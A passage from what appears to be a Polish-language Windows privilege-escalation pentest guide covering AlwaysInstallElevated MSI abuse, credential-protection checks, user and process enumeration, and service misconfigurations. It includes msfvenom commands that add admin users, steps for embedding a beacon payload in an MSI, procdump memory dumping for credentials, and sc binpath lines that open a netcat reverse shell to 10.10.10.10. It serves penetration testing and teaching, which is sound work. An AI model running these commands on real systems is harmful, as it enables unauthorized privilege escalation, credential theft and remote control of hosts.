**Jeśli** te 2 rejestry są **włączone** (wartość **0x1**), użytkownicy z dowolnymi uprawnieniami mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu plik binarny Windows MSI do eskalacji uprawnień. Ten skrypt zapisuje prekompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (wymagany jest więc dostęp do GUI):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten tutorial, aby dowiedzieć się, jak utworzyć MSI wrapper przy użyciu tych narzędzi. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **wiersze poleceń**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- **Wygeneruj** za pomocą Cobalt Strike lub Metasploit **nowy payload Windows EXE TCP** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj lokalizacji **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (wybór plików do uwzględnienia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a następnie w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić też inne właściwości, takie jak **Author** i **Manufacturer**, aby zainstalowana aplikacja wyglądała bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony zaraz po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirusy i detektory

### Ustawienia audytu

Te ustawienia określają, co jest **rejestrowane**, więc należy zwrócić na nie uwagę

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** służy do **zarządzania hasłami lokalnego Administratora**, zapewniając, że każde hasło jest **unikatowe, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy, którym przyznano odpowiednie uprawnienia za pomocą ACL, umożliwiające im wyświetlanie haseł lokalnego administratora.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **hasła w postaci zwykłego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest znajdziesz na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził ulepszoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytywania jej pamięci** lub wstrzykiwania kodu przez niezaufane procesy, zwiększając tym samym bezpieczeństwo systemu.\
[**Więcej informacji o LSA Protection znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego zadaniem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Poświadczenia w pamięci podręcznej

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i używane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zazwyczaj zostają ustanowione poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o poświadczeniach w pamięci podręcznej**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Uprzywilejowane grupy

Jeśli **należysz do jakiejś uprzywilejowanej grupy, możesz być w stanie eskalować uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na poniższej stronie **poznasz interesujące tokeny** i dowiesz się, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / sesje

```bash
qwinsta
klist sessions
```

### Foldery domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Polityka haseł

```bash
net accounts
```

### Pobierz zawartość schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, wyświetlając listę procesów, **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** albo czy masz uprawnienia do zapisu w folderze z plikiem binarnym, aby wykorzystać potencjalne [**ataki DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), ponieważ można je wykorzystać do eskalacji uprawnień.

Listener debuggera może działać krótko, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż zaobserwowany listener z jego PID-em, właścicielem procesu oraz możliwością dostępu użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości wykonywania kodu z innego konta. Rutynową enumerację prowadź pasywnie — nie wysyłaj poleceń do debuggera.

**Sprawdzanie uprawnień plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów plików binarnych procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamic preprocessor Snort

Snort 2 może ładować biblioteki współdzielone z katalogu wskazanego dyrektywą `dynamicpreprocessor directory` w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź tę konkretną konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token pozwala tworzyć tam pliki, ta ścieżka może wymagać sprawdzenia pod kątem code execution przy następnym ładowaniu modułów przez zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta uruchamiającego, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia typu deny lub ograniczenia udziału; sam zapis do katalogu nie potwierdza możliwości eskalacji. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa sieci Web z zapisywalnym katalogiem głównym dokumentów

W instalacji Apache w systemie Windows porównaj ścieżkę pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu głównego dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik o niższych uprawnieniach może tworzyć pliki w tym katalogu, a Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że udostępniana jest dokładnie ta ścieżka oraz że handler po stronie serwera przetwarza dany typ pliku; sam zapis do katalogu głównego potwierdza jedynie możliwość tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W przypadku standardowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja znajduje się obok, w `conf\httpd.conf`, z domyślnym katalogiem głównym `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź dokładny obraz usługi, tożsamość, na której działa, efektywną wartość `DocumentRoot` (uwzględniając rozwinięcie `${INSTALL_DIR}` i nadpisania wirtualnych hostów) oraz ACL katalogu głównego. Zapisywalny katalog WAMP nie dowodzi, że Apache działa jako `SYSTEM` ani że wykonuje przesłany plik. [Apache opisuje, jak usługa Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość sieciowa puli aplikacji

W IIS powiąż zapisywalny katalog fizyczny z **aktywną witryną/aplikacją** w `applicationHost.config`, a następnie ustal skonfigurowaną dla niej pulę i procedurę obsługi po stronie serwera. Kod umieszczony w udostępnionym katalogu działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a żądanie może dotrzeć do tej ścieżki. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan witryny, procedurę obsługi i nadpisania dotyczące danej ścieżki.

Dynamiczna kompilacja ASP.NET to osobna ścieżka do sprawdzenia: wygenerowane pliki w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może to zmienić. [Microsoft opisuje lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca izolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach umożliwia modyfikację wygenerowanego źródła w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie je skompiluje z użyciem bardziej uprzywilejowanej [tożsamości procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL pliku lub katalogu nie dowodzi możliwości wykonania kodu: skoreluj pamięć podręczną z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz momentem ewentualnej ponownej kompilacji. Korzystaj wyłącznie z przeglądu metadanych tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie modyfikuj plików w pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` zwykle uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zazwyczaj używa anonimowych poświadczeń sieciowych. Pula `SpecificUser` korzysta z skonfigurowanego dla niej konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [tożsamość sieciową puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się w zależności od wersji IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli korzystającej z tożsamości sieciowej konta komputera, sprawdź uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam bilet konta komputera lub rola hosta nie dowodzą ich posiadania. Pasywna enumeracja powinna obejmować sprawdzenie konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku dostępnej do odczytu procedury obsługi ASP.NET, która uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, deszyfrowanie, walidację i budowanie polecenia. Procedura obsługi, która łączy zdekodowany token z `ProcessStartInfo("cmd", "/c ...")`, może pozwolić metaznakom powłoki zmienić polecenie; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany klient rzeczywiście może wpływać na zdekodowaną wartość i dotrzeć do procedury obsługi, a następnie określ efektywną tożsamość puli aplikacji lub podszywania się oraz tożsamość procesu potomnego. Linia kodu dostępna do odczytu, nasłuchujący proces na localhost ani słabość formatu tokenu same w sobie nie dowodzą możliwości wykonania uprzywilejowanego polecenia. Przejrzyj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego podczas pasywnej enumeracji.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie pliku PHP, który użytkownik o niższych uprawnieniach może modyfikować, z uprawnieniami procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozwiązana ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytać, obowiązujące ograniczenia ścieżek PHP zezwalają na dołączenie pliku, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Nasłuchujący proces na loopback ani sam zapisywalny plik nie dowodzą istnienia tego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików bez wywoływania endpointu.

### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z pakietu sysinternals. Usługi takie jak FTP przechowują **poświadczenia w pamięci w postaci jawnego tekstu**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niebezpieczne aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektu z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu zrzutu zapisywalnego przez użytkownika o niższych uprawnieniach, przekracza granicę zaufania danych wejściowych w kontekście konta importera. Sprawdź **dokładną ścieżkę zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektów Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie z konta importera, jeśli pozwalały na to [zasady dotyczące wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To wskazówka dotycząca ujawnienia poświadczeń, a nie bezpośredniego dostępu administratora: uzyskana odpowiedź musi dać się wykorzystać przez odrębną, autoryzowaną lub podatną ścieżkę, a aktualne wersje należy oceniać na podstawie ich faktycznego stanu poprawek. Podczas pasywnego rozpoznania nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest odrębne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) z tym prawem jest wskazówką do dalszej analizy, a nie dowodem, że można uruchomić nową usługę. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi określonymi podczas jej tworzenia; późniejsze ponowne otwarcie usługi powoduje osobną kontrolę dostępu i może się nie powieść, nawet jeśli można było użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, prawa przyznane uchwytowi, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Podczas pasywnego rozpoznania nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi zestaw te prawa SCM z udziałem na celu, do którego **to samo logowanie sieciowe** ma prawo zapisu, jego bazową ACL NTFS oraz lokalną ścieżką do pliku wykonywalnego, który konto usługi może uruchomić. Konto niebędące administratorem może przekroczyć tę granicę, jeśli istnieją wyjątkowo szerokie prawa SCM i ścieżka umieszczenia pliku; udział administracyjny nie jest niezbędnym warunkiem. Sam dostęp do zapisu w udziale lub sama wskazówka dotycząca prawa SCM do tworzenia usług nie dowodzą, że nową usługę można uruchomić z wyższą tożsamością.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli tego pliku nie ma w jej `ImagePath`. Jeśli nazwa pomocnika jest rozwiązywana do katalogu zapisywalnego przez użytkownika o niższych uprawnieniach, a usługa działa z wyższą tożsamością, brakujący plik pomocnika może być warunkowym kandydatem do podmiany. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie pomocnika**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia plików w katalogu, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Sam katalog usługi z prawem zapisu lub brakujący plik nie dowodzą, że usługa załaduje ten plik; podczas pasywnego przeglądu nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazywać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo do uruchamiania za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli używa argumentu wybranego przez wywołującego jako ścieżki dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis w chronionym katalogu może prowadzić do eskalacji tylko wtedy, gdy odrębny uprzywilejowany konsument lub loader akceptuje ten plik; sam zapisywalny dziennik lub prawo do uruchamiania nie wystarczą. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ możliwość odczytu `nsclient.ini` jest **wskazówką do przeglądu konfiguracji**: plik może zawierać dane uwierzytelniające do web, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź faktyczne konto usługi, nasłuchujący WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Uprzywilejowane wykonanie wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonania), efektywnego prawa do rejestrowania lub modyfikowania polecenia oraz wyzwalacza, który uruchamia je w kontekście tożsamości usługi. Nasłuch tylko na loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub nasłuch nie dowodzą istnienia tych praw. Podczas pasywnego rozpoznania sprawdzaj metadane i uprawnienia bez wyświetlania sekretów ani wywoływania web API. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące zabezpieczania web i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź faktyczne konto uruchomieniowe usługi oraz jej wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), a `AppDirectory` określa skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za pełny obraz granicy bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji potomnej i ACL jego katalogu nadrzędnego. Lokalny endpoint WCF lub SOAP udostępniany przez tę aplikację to odrębna wskazówka do analizy: potwierdź, że użytkownik o niższych uprawnieniach może dotrzeć do nasłuchującego endpointu, że dokładna operacja akceptuje jego dane wejściowe oraz że proces potomny usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, adres URL endpointu ani zapisywalna ścieżka same w sobie nie dowodzą eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia potok](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania **konkretnej** operacji oraz efektywną tożsamość runspace należy sprawdzić osobno. Ścieżka od danych wejściowych wywołującego o niższych uprawnieniach do `AddScript` działającego z wyższą tożsamością usługi stanowi granicę wykonania kodu; sam nasłuchujący port, uwierzytelniony klient lub nieużywana metoda w niepowiązanym zestawie nie są dowodem. Statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując endpointu podczas rozpoznania.

Service Triggers pozwalają systemowi Windows uruchamiać usługę, gdy wystąpią określone warunki (aktywność nazwanego potoku/endpointu RPC, zdarzenia ETW, dostępność IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi, wywołując ich wyzwalacze. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa diagnostyczna kolektora Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150`, usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. W [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystano wyścig z junction i łączem object managera do przekierowania resetu DACL usługi. Do wykazanej eskalacji potrzebna była również możliwa do użycia ścieżka naprawy MSI dostawcy WMI Visual Studio Setup oraz plik docelowy `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Ten komponent naprawiono w styczniu 2024 r.

W ramach pasywnej wstępnej analizy sprawdź konto i ścieżkę binarną tej konkretnej usługi, sprawdź, czy istnieje ścieżka kompilatora Setup WMI, oraz zweryfikuj stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio lub plik kompilatora nie dowodzą, że host jest podatny. Kontrola nie wymaga uruchamiania usługi ani wykonywania naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się posiadanie pliku binarnego **accesschk** z pakietu _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włączanie usługi

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma włączonych urządzeń z nią powiązanych._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Pamiętaj, że usługa upnphost zależy od SSDPSRV (w przypadku XP SP1)**

**Innym obejściem tego problemu** jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować jej plik wykonywalny. Aby zmodyfikować i uruchomić **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Uruchom ponownie usługę

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia zmianę konfiguracji pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę uprawnień, co pozwala zmieniać konfigurację usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i zmianę uprawnień.
- **GENERIC_WRITE**: Zapewnia możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również zapewnia możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy o niskich uprawnieniach mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć usługę, **podmieniając plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz modyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się ten plik ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Listę wszystkich plików binarnych uruchamianych przez usługi można uzyskać za pomocą **wmic** (poza system32), a uprawnienia sprawdzić za pomocą **icacls**:

```bash
